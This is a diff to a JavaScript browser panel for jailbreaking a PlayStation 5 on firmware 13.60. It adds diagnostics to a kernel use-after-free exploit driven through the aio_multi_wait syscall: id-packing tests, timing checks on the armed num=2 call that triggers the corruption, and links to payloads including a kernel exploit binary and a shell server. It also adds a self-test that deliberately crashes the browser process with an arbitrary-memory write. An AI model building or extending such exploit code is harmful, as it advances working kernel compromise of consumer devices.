@@ -321,6 +321,11 @@
         '    <input class="bwp-in" id="bwp-jurl" placeholder="https://\u2026/payload.js  \u2014 script URL (Y2JB remotejsloader / websrv style host)">',
         '    <button class="bwp-btn" id="bwp-jload">load script</button>',
         '  </div>',
+        '  <div class="bwp-row" id="bwp-payloads"></div>',
+        '  <div class="bwp-row">',
+        '    <button class="bwp-btn" id="bwp-crash">crash-persistence test</button>',
+        '    <span class="bwp-lab">closes the tab on purpose \u2014 see the note</span>',
+        '  </div>',
         '  <div class="bwp-note" id="bwp-note"></div>',
         '</div>',
         '<div class="bwp-foot">',
@@ -1356,8 +1361,18 @@
                 S("close r", 0x006, [BigInt(sfd[1])]);
                 return { ok: true, summary: "submit refused" };
             }
-            var id0 = window.read64(ids), id1 = window.read64(ids + 8n);
-            out("T3b-submit", "ok -- 2 pending MULTI_READ requests, ids=[" + hex(B(id0)) + ", " + hex(B(id1)) + "]", "ok");
+            /* THE ID LAYOUT IS MEASURED HERE, NOT ASSUMED. The submit writes its handles
+             * into THIS buffer, so reading it back reports the stride directly. The v144 run's
+             * raw 64-bit read was 0x1a0c90000a0c9, which decodes as TWO 32-bit ids at
+             * stride 4 (0x0a0c9, 0x1a0c9) -- exactly PSAITO's 4*NREQ layout. Both readings
+             * are printed so the next step is a comparison rather than a guess. */
+            var idLo = rd32(ids), idHi = rd32(ids + 4n);
+            var id0 = B(window.read64(ids)), id1 = B(window.read64(ids + 8n));
+            out("T3b-submit", "ok -- 2 pending MULTI_READ requests. Raw 64-bit read [" + hex(id0) + ", " + hex(id1)
+                + "], decoded as two 32-bit ids at stride 4: [0x" + idLo.toString(16) + ", 0x" + idHi.toString(16) + "]"
+                + (idLo !== 0n && idHi !== 0n
+                    ? " -- BOTH non-zero, i.e. PSAITO's 4*NREQ layout, not one 64-bit handle"
+                    : " -- one of them is ZERO, so the stride may not be 4"), "ok");
 
             /* THE wait -- one id, num=1, and a REAL states buffer: the measured ABI model
              * says states (arg3) is dereferenced whenever num>=1, so passing 0 here would
@@ -1368,6 +1383,119 @@
             out("T3b-wait", "aio_multi_wait(ids, num=1) -> " + (w.ret === undefined ? w.threw : hex(w.ret))
                 + (w.errName ? " (" + w.errName + ")" : "")
                 + " -- num=1 can never reproduce the UAF (that needs num>=2 in ONE call)", "dim");
+
+            /* ============ DID IT ACTUALLY WAIT? The single most diagnostic fact available
+             *
+             * A multi_wait over PENDING requests must BLOCK until they complete. The wake
+             * byte is written further down, so at this point NOTHING has completed. A wait
+             * that returns success in ~0ms therefore did NOT wait -- and a call that never
+             * waited can never have linked a shared waiter node.
+             *
+             * This is the difference between the two verdicts this panel must never
+             * confuse:
+             *   fast return  ->  the ids were not seen as a set of pending requests
+             *                    (OUR encoding/layout), NOT a patched kernel;
+             *   real block   ->  the kernel really waited on our requests, so the ids ARE
+             *                    recognised and the sentinels become the right thing to read.
+             * The v144 console run returned 0x0 in 0-1ms with both reads pending, which is
+             * the first case. Printed as its own row because it outranks every other
+             * interpretation of that run. */
+            var waitMs = (typeof w.ms === "number") ? w.ms : -1;
+            var didBlock = waitMs >= 30;
+            out("T3b-timing", "the wait returned after " + waitMs + "ms with BOTH reads still pending "
+                + "(the wake byte is written later in this tile). "
+                + (didBlock
+                    ? "It BLOCKED -- so the kernel did recognise our ids as pending requests. "
+                    : "It did NOT block, so the ids were not recognised as pending requests: at 0ms "
+                        + "the kernel cannot have waited on anything. That is OUR id encoding or array "
+                        + "layout, not a patched kernel."), didBlock ? "ok" : "warn");
+
+            /* ============ the SAFE differential: WHICH PACKING DOES THE KERNEL RECOGNISE?
+             *
+             * Still num=1 on every call, so this remains structurally incapable of link-
+             * ing a node onto two requests' waiter lists -- the tile's safety property is
+             * untouched. Two packings, and timeout values 0 and 1:
+             *   - 0n is EMPIRICALLY non-blocking on this kernel (the v144 run returned
+             *     immediately with 0), so it cannot hang; that is a measurement, not an
+             *     assumption;
+             *   - 1n is a 1-ms timeout if arg5 really is the timeout, and if it is not, the
+             *     ABI model says arg5 is validated-not-dereferenced, so a small scalar is
+             *     inert. Either way the call is bounded in time -- which is the only thing
+             *     that matters for an operator with no reboot budget.
+             * A packing is "recognised" if the kernel answers something OTHER than the bare
+             * success we get when it finds nothing to wait for. */
+            var idsW = zeros(malloc(0x10), 0x10);
+            window.write_buffer(idsW, u32slot(idLo));        /* slot 0 = id0 widened to 64-bit */
+            window.write_buffer(idsW + 8n, u32slot(idHi));   /* slot 1 = id1 */
+            var packings = [["stride4-as-submitted", ids], ["stride8-widened", idsW]];
+            var tos = [0n, 1n], recognised = [];
+            var sawZero = false, sawEinval = false, sawOther = false, sawThrow = false;
+            /* 0x16 is EINVAL, and it is NOT a recognition signal: the ABI tile measured the
+             * all-zero call as EINVAL too, so a kernel that rejects the ARGUMENT SET answers
+             * EINVAL whatever the ids contain. Counting "non-zero" as recognition made this
+             * differential announce a confident packing recommendation on a model kernel that
+             * never looked at the ids at all -- caught by the harness, and exactly the class of
+             * false claim this panel exists to avoid. Only a BLOCK, or an answer that is
+             * neither 0 nor EINVAL, counts as the kernel having seen the ids. */
+            var EINVAL = 0x16n;
+            for (var pi2 = 0; pi2 < packings.length; pi2++) {
+                for (var ti2 = 0; ti2 < tos.length; ti2++) {
+                    var pname = packings[pi2][0];
+                    var pr2 = S("T3b-poll " + pname + " timeout=" + tos[ti2], 0x297,
+                        [packings[pi2][1], 1n, stbuf, 0n, tos[ti2]], true, true);
+                    var rv = (pr2.ret === undefined) ? pr2.threw : hex(pr2.ret);
+                    var cls, note;
+                    if (pr2.ret === undefined) {
+                        cls = "threw"; note = " -- the call itself failed: " + rv;
+                    } else if (B(pr2.ret) === 0n) {
+                        cls = "zero"; note = " -- nothing to wait for under this packing";
+                    } else if (B(pr2.ret) === EINVAL) {
+                        cls = "einval";
+                        note = " -- EINVAL: the kernel rejected the ARGUMENT SET (the all-zero baseline "
+                            + "answers this too), so this is NOT evidence it saw the ids";
+                    } else {
+                        cls = "reacted";
+                        note = " -- answered something other than 0/EINVAL: THIS packing reached the ids";
+                    }
+                    if (cls === "threw" && typeof pr2.ms === "number" && pr2.ms >= 30) {
+                        /* a throw AFTER a real block is still evidence the kernel waited */
+                        cls = "reacted"; note = " -- it BLOCKED (" + pr2.ms + "ms) before failing";
+                    }
+                    if (typeof pr2.ms === "number" && pr2.ms >= 30 && cls !== "reacted") {
+                        cls = "reacted";
+                        note = " -- it BLOCKED (" + pr2.ms + "ms): the ids WERE recognised";
+                    }
+                    if (cls === "zero") sawZero = true;
+                    else if (cls === "einval") sawEinval = true;
+                    else if (cls === "threw") sawThrow = true;
+                    else { sawOther = true; if (recognised.indexOf(pname) < 0) recognised.push(pname); }
+                    out("T3b-idtest", pname + " timeout=" + tos[ti2] + " -> " + rv
+                        + (pr2.errName ? " (" + pr2.errName + ")" : "") + note,
+                        cls === "reacted" ? "ok" : (cls === "zero" ? "dim" : "warn"));
+                }
+            }
+            var idVerdict;
+            if (recognised.length) {
+                idVerdict = "packing(s) the kernel actually reacted to: " + recognised.join(", ")
+                    + " -- use that layout for the armed call, and re-run this tile to confirm the "
+                    + "timing row turns into a real BLOCK.";
+            } else if (sawEinval && !sawZero && !sawOther) {
+                idVerdict = "every packing answered EINVAL, which is the SAME answer the all-zero call "
+                    + "gets: the kernel is rejecting the ARGUMENT SET before it ever looks at the ids, so "
+                    + "this differential has NOT tested the stride at all. What needs settling is the "
+                    + "argument set itself (an instance handle, a num domain, or the mode/timeout positions).";
+            } else if (sawZero && !sawEinval && !sawOther) {
+                idVerdict = "every packing answered a bare 0x0, so the kernel found nothing to wait for in "
+                    + "ALL of them. That points past the stride: at the submit layout (0x28, fd@+0x20), the "
+                    + "cmd/priority encoding, or the ids pointer being wrong ALTOGETHER -- not at the UAF "
+                    + "itself. Nothing here armed anything, so this is a safe measurement to repeat.";
+            } else if (sawThrow && !sawZero && !sawEinval && !sawOther) {
+                idVerdict = "every poll THREW -- there is no usable measurement here; fix the call shape first.";
+            } else {
+                idVerdict = "mixed answers with no clear winner: read the rows above individually rather "
+                    + "than trusting a summary.";
+            }
+            out("T3b-idverdict", idVerdict, recognised.length ? "ok" : "warn");
 
             /* Wake: complete the pending reads so nothing stays armed behind us.
              * sched_yield settle after: same kernel-worker timing argument as pArm. */
@@ -1389,8 +1517,17 @@
                 + "multi_wait(num=1) answered " + (w.ret === undefined ? w.threw : hex(w.ret)) + (w.errName ? " (" + w.errName + ")" : "")
                 + ", cancel=" + (c.ret === undefined ? c.threw : hex(c.ret)) + (c.errName ? " (" + c.errName + ")" : "")
                 + ", delete=" + (d.ret === undefined ? d.threw : hex(d.ret)) + (d.errName ? " (" + d.errName + ")" : "")
-                + ". This settles what the armed call will see: whether ids from submit are raw handles "
-                + "(wait ESRCH-free) or need an indirection, and which of mode/timeout positions the "
+                + ". ID ENCODING: " + (didBlock
+                    ? "the wait BLOCKED (" + waitMs + "ms), so the kernel does recognise our ids as "
+                        + "pending requests -- the armed call's ids are good"
+                    : "the wait did NOT block (" + waitMs + "ms) while the reads were still pending, so the "
+                        + "kernel did not recognise our ids as a set of pending requests. "
+                        + (recognised.length
+                            ? "The differential found a packing it DOES react to: " + recognised.join(", ")
+                            : "No packing got a reaction, so the problem is earlier than the stride -- "
+                                + "the submit layout (0x28, fd@+0x20), the cmd/priority encoding, or the ids "
+                                + "pointer itself."))
+                + " This settles what the armed call will see and which of mode/timeout positions the "
                 + "kernel accepts. What it can NEVER do is arm the UAF -- every call here had num<=1, "
                 + "and the corruption needs num>=2 in ONE call. That step stays behind your explicit go.", "ok");
             notify("bagagwa T3b live request: wait=" + (w.ret === undefined ? "threw" : hex(w.ret)) + " on " + FW);
@@ -1898,6 +2035,26 @@
             try { w = S("aio_multi_wait(ids, num=2) -- THE UAF", 0x297, wargs); }
             catch (e) { threw = String((e && e.message) || e).slice(0, 90); }
             out("ARM-wait", "num=2 returned " + (w && w.ret !== undefined ? hex(w.ret) + (w.errName ? " (" + w.errName + ")" : "") : (threw || "threw")), w && w.ret !== undefined && B(w.ret) === 0n ? "ok" : "warn");
+
+            /* THE TIMING ROW. Same argument as T3b-timing, and here it is decisive: the wake
+             * byte is written BELOW this line and the reads are still pending, so a num=2 wait
+             * that returns quickly CANNOT have waited -- therefore it cannot have walked the
+             * node onto two requests' waiter lists either. That makes a fast return PROOF the
+             * leaf was never armed, independently of every sentinel. Without this row a run
+             * like v144's reads as the vague "no observable effect" and invites the wrong
+             * conclusion ("13.60 is patched") when the real answer is "the ids were not
+             * recognised" -- which the AIO live-request tile above now measures directly. */
+            var armMs = (w && typeof w.ms === "number") ? w.ms : -1;
+            var armBlocked = armMs >= 30;
+            out("ARM-timing", "the armed wait returned after " + armMs + "ms, with both MULTI_READs still "
+                + "pending (their wake byte is written below). "
+                + (armBlocked
+                    ? "It BLOCKED -- so it really did wait on our requests, and if no detector moved, "
+                        + "the link happened but nothing landed in observed memory."
+                    : "It did NOT block -- so it never waited on our requests and never walked the node "
+                        + "onto their waiter lists. THE UAF WAS NOT ARMED by this call; read this as "
+                        + "OUR id encoding/submit layout, not as a patched kernel."),
+                armBlocked ? "dim" : "warn");
             settle(200);                                    /* let kernel workers run */
 
             /* -- RECLAIM BEFORE THE WAKE. The waker runs at WAKE time, walking req->waiters
@@ -1976,9 +2133,15 @@
                 return { ok: true, summary: "UAF CONFIRMED (witness-hit)" };
             }
             out("ARM-VERDICT", "NO OBSERVABLE EFFECT: the armed call completed (wait=" + hex(w.ret) + (w.errName ? " (" + w.errName + ")" : "")
-                + ") and every detector is unchanged. That is a REAL measurement, not a failure: either the id encoding "
-                + "or the mode/timeout positions are still wrong, or the node was reclaimed uninterestingly. "
-                + "Run the AIO live-request tile next: it settles the id encoding with num=1. Reboot before any further run.", "warn");
+                + ") and every detector is unchanged. "
+                + (armBlocked
+                    ? "It DID block, so the kernel really waited on our requests -- the ids are good and "
+                        + "the remaining unknowns are the mode/timeout positions or an uninteresting reclaim."
+                    : "It did NOT block (" + armMs + "ms, reads still pending): the call never waited, so it "
+                        + "never linked a shared waiter node and the UAF was NOT armed. This run is NOT "
+                        + "evidence about whether " + FW + " is patched -- read the AIO live-request tile's "
+                        + "T3b-timing / T3b-idverdict rows instead, they measure the id encoding directly.")
+                + " Reboot before any further run.", "warn");
             notify("bagagwa ARM: no observable effect (wait=" + hex(w.ret) + ") on " + FW);
             nres("armed, NO observable effect (wait=" + hex(w.ret) + ")", "ARM");
             return { ok: true, summary: "armed, no observable effect" };
@@ -2110,6 +2273,22 @@
         var s = "";
         for (var i = 0; i < n; i++) s += (b[i] >= 0x20 && b[i] < 0x7f) ? String.fromCharCode(b[i]) : ".";
         return s;
+    }
+    /* A 32-bit value in the LOW half of an 8-byte slot. Used by the id-packing differential
+     * below: the two candidate layouts for the ids array are "32-bit ids at stride 4"
+     * (PSAITO's 4*NREQ) and "each id widened into its own 64-bit slot". */
+    function u32slot(v) {
+        var b = new Uint8Array(8);
+        b[0] = Number(v & 0xffn); b[1] = Number((v >> 8n) & 0xffn);
+        b[2] = Number((v >> 16n) & 0xffn); b[3] = Number((v >> 24n) & 0xffn);
+        return b;
+    }
+    /* Read a 32-bit dword, preferring window.read32 but falling back to a slice of read64
+     * when the adapter does not expose it (p2jb_poops.js does; a harness or a different
+     * adapter may not, and a missing helper must not abort a whole tile). */
+    function rd32(a) {
+        try { if (typeof window.read32 === "function") return B(window.read32(a)); } catch (e) { }
+        return B(window.read64(a)) & 0xFFFFFFFFn;
     }
     /* A classic hexdump, bounded: a log line count limit is not decoration here --
      * this panel's DOM and its localStorage tail are the two ways a big dump kills
@@ -2716,6 +2895,79 @@
         mini.style.display = "none";
     };
 
+    /* ============================================ PAYLOADS (the ELF route)
+     * The reason the Lua `ftp_server.lua` detour is not needed: this repo already ships the
+     * maintained servers as ELFs. They are delivered by elfldr, which listens on the console
+     * at :9021 -- that is a TCP socket, so it CANNOT be driven from a page served by GitHub
+     * Pages (our api/payload.php path needs PHP and a server). What this panel can honestly
+     * do is put the files one tap away and give the exact command, so "I want FTP on the
+     * console" has a route that works on 13.60 instead of one that needs a specific game. */
+    var ELFS = [
+        ["ftpsrv-ps5.elf", "FTP server \u2014 the real answer to ftp_server.lua; WinSCP, not FileZilla"],
+        ["websrv-ps5.elf", "HTTP + WebDAV payload server (ps5-payload-dev/websrv)"],
+        ["elfldr-ps5-1360.elf", "the loader itself \u2014 sends the others over :9021"],
+        ["etaHEN.elf", "homebrew enabler"],
+        ["kstuff.elf", "kernel stuff (needs an enable flag; read its README first)"],
+        ["klogsrv-ps5.elf", "kernel log over the network"],
+        ["shsrv-ps5.elf", "shell server"],
+        ["gdbsrv-ps5.elf", "gdb stub"],
+        ["pldmgr.elf", "payload manager"],
+        ["autoloader.elf", "autoloads payloads at boot"],
+        ["bridge.elf", "bridge"],
+        ["shadowmountplus.elf", "mount helper"],
+        ["kexp_2026_05_25.bin", "kernel exploit binary (kexp)"],
+    ];
+    try {
+        var pv = document.getElementById("bwp-payloads");
+        if (pv) {
+            var lab = document.createElement("span");
+            lab.className = "bwp-lab";
+            lab.textContent = "ELF payloads \u2192";
+            pv.appendChild(lab);
+            for (var ei = 0; ei < ELFS.length; ei++) {
+                var a2 = document.createElement("a");
+                a2.className = "bwp-lnk";
+                a2.href = "payloads/" + ELFS[ei][0];
+                a2.textContent = ELFS[ei][0];
+                a2.title = ELFS[ei][1];
+                pv.appendChild(a2);
+            }
+        }
+    } catch (e) { }
+
+    /* ------------------------------------------- CRASH-PERSISTENCE SELF-TEST
+     * The JS port of the ONLY portable idea in `streaming_output.lua`: it deliberately dies
+     * twice to prove the output pipeline survives the payload crashing. We make the same
+     * claim -- `bwslop_sc_log` is supposed to outlive a WebProcess death -- and had never
+     * tested it. This writes a marker, then writes 8 bytes to an UNMAPPED address, which
+     * kills the WebProcess exactly as the Lua payload's two bogus writes do.
+     *
+     * It is NOT a tile and NOT part of RUN ALL, because it CLOSES THE TAB. That is the
+     * experiment, not a side effect. The proof is after the fact: reload, and the restored
+     * log must contain the marker (the check at startup below). */
+    function crashTest() {
+        var marker = "SCRASH " + FW + " " + Date.now();
+        try { localStorage.setItem("bwslop_crash_test", marker); } catch (e) { }
+        paint("--- crash-persistence self-test ---", "sec");
+        out("CRASH", "marker written to localStorage: " + marker, "warn");
+        out("CRASH", "the next statement writes 8 bytes to an UNMAPPED address via window.write64. "
+            + "The WebProcess will die -- that IS the experiment. Reload, then look for the marker "
+            + "in the restored saved log; if it is there, crash persistence is PROVEN. "
+            + "If instead you read a THREW or a DID-NOT-FAULT row below, the process survived and "
+            + "this run proves nothing.", "warn");
+        try {
+            window.write64(0x4141414141414141n, 0xDEADBEEFn);
+            out("CRASH", "the write did NOT fault -- nothing was proven (inconclusive)", "err");
+        } catch (e) {
+            out("CRASH", "threw instead of dying: " + String((e && e.message) || e).slice(0, 90)
+                + " -- inconclusive, the process survived", "err");
+        }
+    }
+    try {
+        var cb = document.getElementById("bwp-crash");
+        if (cb) cb.onclick = crashTest;
+    } catch (e) { }
+
     /* ============================================================== start */
 
     chip(elUl, "ok", "userland OK");
@@ -2740,6 +2992,16 @@
         var csb = document.getElementById("bwp-clearsaved");
         if (csb) csb.style.display = "";
     }
+
+    /* CRASH-PERSISTENCE PROOF, read on the NEXT load. If the crash self-test ran, its
+     * marker is still readable here -- which is the whole claim, demonstrated rather than
+     * asserted. Reported as its own row so it cannot be mistaken for routine output. */
+    try {
+        var cmk = localStorage.getItem("bwslop_crash_test");
+        if (cmk) paint("CRASH-PERSISTENCE PROVEN: the marker written by the crash self-test "
+            + "survived the WebProcess death and is readable on this load: " + cmk
+            + "  (this is the browser-side equivalent of streaming_output.lua's SIGSEGV test)", "ok");
+    } catch (e) { }
 
     notify("bagagwa panel up on " + FW);
 
